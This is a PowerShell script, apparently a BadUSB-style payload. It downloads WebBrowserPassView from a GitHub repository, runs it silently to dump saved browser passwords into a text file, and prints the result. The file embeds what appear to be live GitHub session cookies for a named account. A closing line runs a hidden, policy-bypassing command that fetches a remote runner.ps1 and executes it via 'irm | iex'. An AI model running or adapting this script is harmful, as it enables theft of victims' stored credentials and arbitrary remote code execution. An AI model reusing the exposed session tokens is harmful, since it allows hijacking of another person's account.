$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/sfile $txtFile"


Set-Location -path $runDirectory
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
$session.Cookies.Add((New-Object System.Net.Cookie("_octo", "GH1.1.1361019306.1713167694", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("preferred_color_mode", "light", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("tz", "Europe%2FAmsterdam", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("_device_id", "bd0c60b9ef1e242c12c6e2d5bb6fe775", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("saved_user_sessions", "167071721%3AkLlhCtPmSBMuLuYqrdKHym6JdLR1tMXPz5yKnCNaPkIWefVb", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("user_session", "kLlhCtPmSBMuLuYqrdKHym6JdLR1tMXPz5yKnCNaPkIWefVb", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("__Host-user_session_same_site", "kLlhCtPmSBMuLuYqrdKHym6JdLR1tMXPz5yKnCNaPkIWefVb", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("tz", "Europe%2FAmsterdam", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("color_mode", "%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("logged_in", "yes", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("dotcom_user", "MaxAxoft", "/", ".github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("has_recent_activity", "1", "/", "github.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("_gh_sess", "c2oYsRXKqRT3KIb%2B0%2Bd%2Bz%2BWs%2FEGmGwp6Ur5oS7jt6LzlhPA%2Ff8q8aUJqq1fpcHu6MpEsohSxy9GQ1A6DBA7s%2FJArH92NU82j8n4SpNXihtNEBtaAoDecsRk%2BI285%2FR2b%2FqMM9UYTZdMb2et69qJ3y6s4iioAN2Esj1k5l1QRLZTi3vkteGS43%2BHvqXBk984xIpeanQ3wuwXguI8WKTftSoMxY1C932smptyfjxu86E1m8jE7Gdw9t1OL%2FFUAjSIsd0dJOb9G0ezBRjMlpmr5c8yzombx2%2FiJDituiGt5GVGMOFrum9Zga3oHt71FqjhSIHvlCNL5%2B0habr4sgS4pKau3zNKjvuGXACp765BfQjKI%2B2fJ4AWnBZibJejB9Z9y97pXDlQlKndcdg3%2FTJCYyjpUZ0k%3D--RlPSjv3p2JvbuY8C--ctL46YCzyc3Zp6B%2BD23Krw%3D%3D", "/", "github.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://github.com/MaxAxoft/demo/blob/main/WebBrowserPassView.zip" `
-WebSession $session -OutFile $zipFolder `
-Headers @{
"authority"="github.com"
  "method"="GET"
  "path"="/MaxAxoft/demo/blob/main/WebBrowserPassView.zip"
  "scheme"="https"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "accept-encoding"="gzip, deflate, br, zstd"
  "accept-language"="en,nl;q=0.9,en-GB;q=0.8,en-US;q=0.7"
  "cache-control"="max-age=0"
  "if-none-match"="W/`"dcaa09bf8e3ca7cd0ac1b75256d0269b`""
  "referer"="https://github.com/MaxAxoft/demo"
  "sec-ch-ua"="`"Microsoft Edge`";v=`"123`", `"Not:A-Brand`";v=`"8`", `"Chromium`";v=`"123`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}
Expand-Archive $zipFolder -DestinationPath $unzipFolder
& "$exeFile" $params
$txtFile

#STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex

